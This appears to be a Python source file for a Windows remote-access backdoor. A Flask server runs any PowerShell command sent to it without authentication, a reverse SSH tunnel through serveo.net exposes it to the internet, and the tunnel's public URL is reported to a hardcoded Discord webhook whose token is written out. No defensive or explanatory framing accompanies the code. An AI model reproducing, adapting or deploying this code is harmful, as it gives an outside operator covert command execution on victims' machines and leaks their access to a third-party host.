from flask import Flask, request, jsonify
from flask_cors import CORS
from discord_webhook import DiscordWebhook
import secrets
import subprocess
import threading
import random

class FlaskServer:
    def __init__(self):
        self.app = Flask(__name__)
        CORS(self.app)  
        self.app.secret_key = secrets.token_hex(50)
        self.current_directory = ""  # Initialize the working directory as an empty string
        self._setup_routes()

    def _setup_routes(self):
        self.app.add_url_rule("/checkup", "checkup", self.checkup, methods=['GET'])
        self.app.add_url_rule("/", "index", self.index, methods=['POST'])

    def checkup(self):
        return "", 200

    def index(self):
        command = request.json.get('command', '')
        try:
            # Check if the command is 'cd'
            if command.lower().startswith("cd "):
                new_directory = command[3:].strip()

                # Use subprocess to check if the directory exists
                check_command = ["powershell", "-Command", f"Test-Path '{new_directory}'"]
                result = subprocess.run(check_command, capture_output=True, text=True)

                if result.returncode == 0 and result.stdout.strip() == "True":
                    self.current_directory = new_directory
                    response = {'response': f'Changed directory to {self.current_directory}', 'status': 'success'}
                else:
                    response = {'response': f'Invalid directory {new_directory}', 'status': 'error'}
                return jsonify(response), 200

            # Execute PowerShell command using subprocess
            full_command = f"cd '{self.current_directory}'; {command}" if self.current_directory else command
            result = subprocess.run(
                ["powershell", "-Command", full_command],
                capture_output=True,
                text=True
            )
            return jsonify({
                'response': result.stdout or result.stderr,
                'status': 'success' if result.returncode == 0 else 'error'
            }), 200 if result.returncode == 0 else 400
        except Exception as e:
            return jsonify({'error': str(e)}), 500

    def run(self, port):
        self.app.run(host="127.0.0.1", port=port, use_reloader=False)


class SSHTunnel:
    def __init__(self, port):
        self.port = port
        self.check = False
        self.webhook_url = "https://discord.com/api/webhooks/1266895186470895648/ycPxI3ZknYppfpxkfUyJBcmFoG9mqF-KuoHPLL6LccO1xLqeboFdkrjx0_wnaVnxNPpY"

    def send_hook(self, line):
        self.check = True
        webhook = DiscordWebhook(url=self.webhook_url, content=f"New URL: {line}")
        webhook.execute()

    def run(self):
        ssh_command = ["ssh", "-R", f"80:127.0.0.1:{self.port}", "serveo.net"]

        process = subprocess.Popen(
            ssh_command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        for line in process.stdout:
            print(line, end='')  # Print output in real-time
            if line and not self.check:
                self.send_hook(line)
            if 'yes/no' in line:
                process.stdin.write('yes\n')
                process.stdin.flush()

        process.wait()

if __name__ == "__main__":
    port = random.randint(49152, 65535)

    # Initialize Flask server and SSH tunnel
    flask_server = FlaskServer()
    ssh_tunnel = SSHTunnel(port)

    # Create and start the Flask server thread
    flask_thread = threading.Thread(target=flask_server.run, args=(port,))
    flask_thread.start()

    # Create and start the SSH tunnel thread
    ssh_thread = threading.Thread(target=ssh_tunnel.run)
    ssh_thread.start()

    # Optionally: Join threads if you want to wait for them to finish
    flask_thread.join()
    ssh_thread.join()
